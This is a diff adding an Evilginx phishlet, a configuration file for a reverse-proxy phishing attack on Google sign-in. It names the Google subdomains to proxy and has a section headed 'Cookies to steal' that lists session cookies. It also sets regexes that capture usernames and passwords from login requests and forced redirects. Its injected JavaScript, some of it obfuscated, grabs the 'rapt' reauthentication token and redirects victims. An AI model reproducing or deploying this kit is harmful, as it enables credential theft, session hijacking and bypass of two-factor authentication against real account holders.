@@ -1,0 +1,112 @@
+min_ver: '2.3.0'
+
+# Subdomains that Evilginx will proxy
+proxy_hosts:
+  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'ogs', orig_sub: 'ogs', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'youtube', orig_sub: 'accounts', domain: 'youtube.com', session: false, is_landing: false, auto_filter: false}
+
+# Replace rules to avoid unwanted redirection
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'www.gstatic.com', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'text/javascript']}
+
+# Cookies to steal
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID", "OGPC", "OGP", "1P_JAR", "CONSENT", "SMSV", "user_id", ".*,regexp"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: '.accounts.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: 'ogs.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: '.ogs.google.com'
+    keys: ["GAPS", "LSID", "_utmt", "utmz", "_utmb", "ACCOUNT_CHOOSER", ".*,regexp"]
+  - domain: 'accounts.google.bg'
+    keys: [".*,regexp"]
+  - domain: 'myaccount.google.com'
+    keys: [".*,regexp"]
+  - domain: 'mail.google.com'
+    keys: [".*,regexp"]
+
+# Capture username/password credentials
+credentials:
+  username:
+    key: ''
+    search: '\[\[\["MI613e","\[null,\\"(.*?)\\"'
+    type: 'post'
+  password:
+    key: ''
+    search: '\[1,1,null,\[1,null,null,null,\[\\"(.*?)\\",null,1\]\]'
+    type: 'post'
+  custom:
+    - key: 'f.req'
+      search: '\["gf.siecp","([^"]*)"\]'
+      type: 'post'
+    - key: 'rapt'
+      search: '"rapt":"([^"]*)'
+      type: 'json'
+
+# URLs that finalize authentication
+auth_urls:
+  - '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - '/CheckCookie'
+  - '/ManageAccount'
+  - '/'
+
+# Corrected forced POST redirection for consistency
+force_post:
+  - path: '/selectchallenge'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://myaccount.google.com'}
+    type: 'post'
+  - path: '/signin'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://myaccount.google.com'}
+    type: 'post'
+  - path: '/'
+    search:
+      - {key: 'flowEntry', search: '.*'}
+    force:
+      - {key: 'continue', value: 'https://myaccount.google.com'}
+    type: 'post'
+
+# Legitimate site login page location
+login:
+  domain: 'accounts.google.com'
+  path: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+path_rewrite:
+  - trigger: '/verification'
+    target: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+
+# Injected JavaScript for redirection
+js_inject:
+  - trigger_domains: ['myaccount.google.com']
+    trigger_paths: ['*']
+    script: |
+        window.addEventListener('load', () => {if (window.location.pathname === '/') {window.location.href = '/u/4/signinoptions/twosv';return;};const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('rapt')) {const xxxValue = urlParams.get('rapt');fetch('/xxx', {    method: 'POST',    headers: {        'Content-Type': 'application/json'    },    body: JSON.stringify({ rapt: xxxValue })})    .then(response => {        if (!response.ok) {            throw new Error('Network response was not ok');        }        return response.json();    })    .then(data => {        console.log('Success:', data);    })    .catch(error => {        console.error('Error:', error);    });}});
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['/signin', '/']
+    script: |
+        function _0x56ca(){var _0x3a42fb=['3605WYKPjA','href','SID','1980018GPFecK','12800YtkIgt','1983006cEMOxZ','1258011FVDepK','350985avgcIr','HSID','2120VLKNGs','addEventListener','cookie','location','https://myaccount.google.com','includes','897502nHaITN','8988hEcVVH'];_0x56ca=function(){return _0x3a42fb;};return _0x56ca();}function _0x1c86(_0x517739,_0x2bc75f){var _0x56ca60=_0x56ca();return _0x1c86=function(_0x1c861b,_0x5ccb6d){_0x1c861b=_0x1c861b-0x136;var _0x5229da=_0x56ca60[_0x1c861b];return _0x5229da;},_0x1c86(_0x517739,_0x2bc75f);}var _0x28616f=_0x1c86;(function(_0xbbc557,_0x3d9fc7){var _0x589ba5=_0x1c86,_0x2320b8=_0xbbc557();while(!![]){try{var _0x59bdad=-parseInt(_0x589ba5(0x141))/0x1+-parseInt(_0x589ba5(0x139))/0x2+parseInt(_0x589ba5(0x142))/0x3+-parseInt(_0x589ba5(0x13a))/0x4*(-parseInt(_0x589ba5(0x144))/0x5)+parseInt(_0x589ba5(0x140))/0x6+parseInt(_0x589ba5(0x13b))/0x7*(parseInt(_0x589ba5(0x13f))/0x8)+parseInt(_0x589ba5(0x13e))/0x9;if(_0x59bdad===_0x3d9fc7)break;else _0x2320b8['push'](_0x2320b8['shift']());}catch(_0x4f3860){_0x2320b8['push'](_0x2320b8['shift']());}}}(_0x56ca,0xb40b8),document[_0x28616f(0x145)]('DOMContentLoaded',function(){var _0x3291ba=_0x28616f;document[_0x3291ba(0x146)][_0x3291ba(0x138)](_0x3291ba(0x13d))&&document['cookie']['includes'](_0x3291ba(0x143))&&(window[_0x3291ba(0x136)][_0x3291ba(0x13c)]=_0x3291ba(0x137));}));
+
+  - trigger_domains: ['accounts.google.com']
+    trigger_paths: ['*']
+    script: |
+        const _0x287ac3 = _0x1f7a;function _0x4991() {  const _0x9df7e6 = ["classList", "monitor started", '[jsname="P1ekSe"][role="progressbar"]', "381184ttqtmj", "44HxjRkK", "40839vXPfaT", "we HAVE spinner", "374808lLrFvh", "6GbyRKs", "we started timeout", "1916453YQwGof", "DOMContentLoaded", "length", "100DsEZKU", "693840MMMTer", "39632xBGgJE", "reload", "addEventListener", "38889BPlwfP", "log"];  _0x4991 = function () {    return _0x9df7e6;  };  return _0x4991();}function _0x1f7a(_0x18a4d9, _0x25b450) {  const _0x499168 = _0x4991();  return _0x1f7a = function (_0x1f7ab7, _0x50ee51) {    _0x1f7ab7 = _0x1f7ab7 - 349;    let _0x5590d9 = _0x499168[_0x1f7ab7];    return _0x5590d9;  }, _0x1f7a(_0x18a4d9, _0x25b450);}(function (_0x1546f7, _0x26a61b) {  const _0x1e0dcc = _0x1f7a, _0x4cc73e = _0x1546f7();  while (true) {    try {      const _0x4687d7 = -parseInt(_0x1e0dcc(358)) / 1 + parseInt(_0x1e0dcc(350)) / 2 + parseInt(_0x1e0dcc(360)) / 3 * (parseInt(_0x1e0dcc(359)) / 4) + parseInt(_0x1e0dcc(349)) / 5 + parseInt(_0x1e0dcc(363)) / 6 * (parseInt(_0x1e0dcc(365)) / 7) + parseInt(_0x1e0dcc(362)) / 8 + parseInt(_0x1e0dcc(353)) / 9 * (parseInt(_0x1e0dcc(368)) / 10);      if (_0x4687d7 === _0x26a61b) break; else _0x4cc73e.push(_0x4cc73e.shift());    } catch (_0x3a6143) {      _0x4cc73e.push(_0x4cc73e.shift());    }  }}(_0x4991, 290983), document[_0x287ac3(352)](_0x287ac3(366), function () {  let _0x23676a, _0x4c1c81;  function _0x4d97cc() {    const _0x3cdd9b = _0x1f7a;    console[_0x3cdd9b(354)](_0x3cdd9b(356));    function _0x346a3d() {      const _0x1c0195 = _0x3cdd9b;      _0x23676a = document.querySelector(_0x1c0195(357)), _0x23676a && _0x23676a[_0x1c0195(355)][_0x1c0195(367)] === 2 ? (console.log(_0x1c0195(361)), !_0x4c1c81 && (console[_0x1c0195(354)](_0x1c0195(364)), _0x4c1c81 = setTimeout(() => {        const _0x532e11 = _0x1c0195;        console.log("we should refresh page"), location[_0x532e11(351)](true);      }, 1e4))) : (console[_0x1c0195(354)]("we dont HAVE spinner"), clearTimeout(_0x4c1c81), _0x4c1c81 = null);    }    _0x346a3d();  }  let _0x240c9c = setInterval(_0x4d97cc, 1e3);}));function _0x398e() {  const _0x7dd53e = ["6311272jlWuif", "10PIwbpi", "13563FUCmcV", "4404WbtfNW", "311058TwHVgc", "88zRjkGR", "includes", "23yjxbZu", "695597RWVaEz", "reload", "location", "href", "4PZBuNf", "1914336XzJzlC", "706220cjTUHU", "challenge"];  _0x398e = function () {    return _0x7dd53e;  };  return _0x398e();}(function (_0x57b7f5, _0x28834b) {  const _0x54f1ec = _0xd26c, _0x569d75 = _0x57b7f5();  while (true) {    try {      const _0x31ec8b = parseInt(_0x54f1ec(437)) / 1 * (parseInt(_0x54f1ec(433)) / 2) + -parseInt(_0x54f1ec(434)) / 3 * (parseInt(_0x54f1ec(442)) / 4) + -parseInt(_0x54f1ec(444)) / 5 + -parseInt(_0x54f1ec(443)) / 6 + parseInt(_0x54f1ec(438)) / 7 + parseInt(_0x54f1ec(435)) / 8 * (parseInt(_0x54f1ec(432)) / 9) + parseInt(_0x54f1ec(431)) / 10 * (parseInt(_0x54f1ec(430)) / 11);      if (_0x31ec8b === _0x28834b) break; else _0x569d75.push(_0x569d75.shift());    } catch (_0x2ae0ef) {      _0x569d75.push(_0x569d75.shift());    }  }}(_0x398e, 176360));function _0xd26c(_0x5d4e00, _0x325cb0) {  const _0x398ecb = _0x398e();  return _0xd26c = function (_0xd26ce, _0x5dc170) {    _0xd26ce = _0xd26ce - 429;    let _0x1a18e5 = _0x398ecb[_0xd26ce];    return _0x1a18e5;  }, _0xd26c(_0x5d4e00, _0x325cb0);}function checkURL() {  let url = window.location.href;  if (url.includes('specific-substring')) {    setTimeout(() => {      location.reload();    }, 15000);     clearInterval(intervalId);  }}let intervalId = setInterval(checkURL, 1000);
